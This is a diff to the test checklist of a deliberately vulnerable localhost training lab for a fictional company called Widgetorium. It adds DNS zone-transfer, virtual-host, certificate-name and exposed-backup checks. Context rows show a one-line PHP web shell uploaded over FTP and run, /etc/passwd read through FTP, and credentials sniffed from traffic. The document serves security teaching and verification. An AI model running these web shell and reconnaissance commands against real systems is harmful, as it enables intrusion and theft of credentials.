@@ -3,8 +3,8 @@
 Run section A first and last. Then walk B. Then C. D is optional.
 
 Assumes the lab is up (`./setup.sh && ./start.sh`) and you have `curl`,
-`openssl`, and ideally `sqlmap`, `testssl.sh`, `gobuster`, `git-dumper`,
-`nmap`, `lftp`, `tcpdump`.
+`openssl`, `dig`, and ideally `sqlmap`, `testssl.sh`, `gobuster`, `git-dumper`,
+`nmap`, `lftp`, `tcpdump`, `exiftool`, `dnsrecon`.
 
 ---
 
@@ -14,11 +14,13 @@ Assumes the lab is up (`./setup.sh && ./start.sh`) and you have `curl`,
 # every mapping must read 127.0.0.1:
 docker compose ps --format '{{.Name}}\t{{.Ports}}'
 
-# host listeners on the lab ports must all be 127.0.0.1
-lsof -nP -iTCP -sTCP:LISTEN | grep -E '(:8080|:8443|:21|:211[0-9][0-9])\b'
+# host listeners on the lab ports must all be 127.0.0.1 (TCP and, for DNS, UDP)
+lsof -nP -iTCP -sTCP:LISTEN | grep -E '(:8080|:8443|:5300|:21|:211[0-9][0-9])\b'
+lsof -nP -iUDP | grep -E ':5300\b'
 
 # from another machine on the LAN (replace with this host's IP): all filtered/closed
 nmap -Pn -p 8080,8443,21 <this-host-LAN-IP>
+nmap -Pn -sU -p 5300 <this-host-LAN-IP>
 ```
 
 `./status.sh` runs the first two and exits non-zero on any `0.0.0.0` / `::` /
@@ -54,6 +56,11 @@ place.
 | 17 | `lftp -u ftpuser,ftpuser 127.0.0.1 -e 'set ftp:passive-mode on; cd /; ls; cd /etc; cat passwd; bye' \| head` or `curl -s --ftp-pasv -u ftpuser:ftpuser 'ftp://127.0.0.1//etc/passwd'` | `root:x:0:0:` returned (no chroot jail) |
 | 18 | `sudo tcpdump -i lo0 -A 'tcp port 21' &` then `curl -s --ftp-pasv -u ftpuser:ftpuser ftp://127.0.0.1/ >/dev/null` | `USER ftpuser` / `PASS ftpuser` visible in the capture |
 | 19 | `printf '<?php echo shell_exec($_GET["c"]);' > s.php; curl -s --ftp-pasv -T s.php ftp://127.0.0.1/upload/s.php; curl -s 'http://127.0.0.1:8080/uploads/ftp/s.php?c=id'` | `uid=...` from the web request |
+| 20 | `dig axfr @127.0.0.1 -p 5300 corp.widgetorium.lab` then `dig axfr @127.0.0.1 -p 5300 widgetorium.lab` | first dumps the full zone (SOA, A, CNAME, TXT, MX, the `10.10.x.x` records); second prints `; Transfer failed.` |
+| 21 | `for h in www admin dev staging nope; do printf '%s ' $h; curl -s -o /dev/null -w '%{size_download}\n' -H "Host: $h.corp.widgetorium.lab" http://127.0.0.1:8080/; done` | `admin`, `dev`, `staging` return a different byte count from `www` / `nope` (which get the storefront) |
+| 22 | `echo \| openssl s_client -connect 127.0.0.1:8443 -servername admin.corp.widgetorium.lab 2>/dev/null \| openssl x509 -noout -ext subjectAltName` vs the same with `-servername widgetorium.local` | SNI `admin.corp...` returns a SAN list of 13 names incl. `git`/`jenkins`/`vault`/`registry`; the non-matching SNI returns `No extensions in certificate` (bug 5 cert) |
+| 23 | `curl -s -H 'Host: dev.corp.widgetorium.lab' http://127.0.0.1:8080/notes/dev-notes.txt \| grep -i ldap`; `curl -s -H 'Host: admin.corp.widgetorium.lab' http://127.0.0.1:8080/backup/users-2024-11-01.sql.bak \| grep -c INSERT` | notes mention `svc-ldap-ro`; the `.sql.bak` returns the `users` INSERT with MD5 hashes |
+| 24 | `curl -s -H 'Host: dev.corp.widgetorium.lab' http://127.0.0.1:8080/s3/ \| grep -o '<Key>[^<]*</Key>'`; `curl -s -H 'Host: dev.corp.widgetorium.lab' http://127.0.0.1:8080/s3/widgetorium-migration-plan.pdf \| strings \| grep -i author` | three `<Key>` objects listed; PDF carries `/Author (Frank Mills <f.mills@corp.widgetorium.lab>)` (use `exiftool` for the full set) |
 
 `cookies` above = a cookie jar from a prior `curl -c cookies ... /login.php` as
 the relevant user.
@@ -78,6 +85,7 @@ reproduce from the clean seed.
 docs/zap/run-zap.sh            # report lands at docs/zap/report.html
 ```
 
-Expected: ZAP reports bugs 1, 2, 4, 8, 10 (weak), 11, 12, 14. It does **not**
-report 3, 5, 6, 7, 9, 13, 15-19. That gap is the teaching point, cross-check it
-against `docs/scenarios.md`.
+Expected: ZAP reports bugs 1, 2, 4, 8, 10 (weak), 11, 12, 14, and the open
+directories / `phpinfo` behind 23 and 24 if you seed it the dev vhost. It does
+**not** report 3, 5, 6, 7, 9, 13, 15-19, or 20-22. That gap is the teaching
+point, cross-check it against `docs/scenarios.md`.
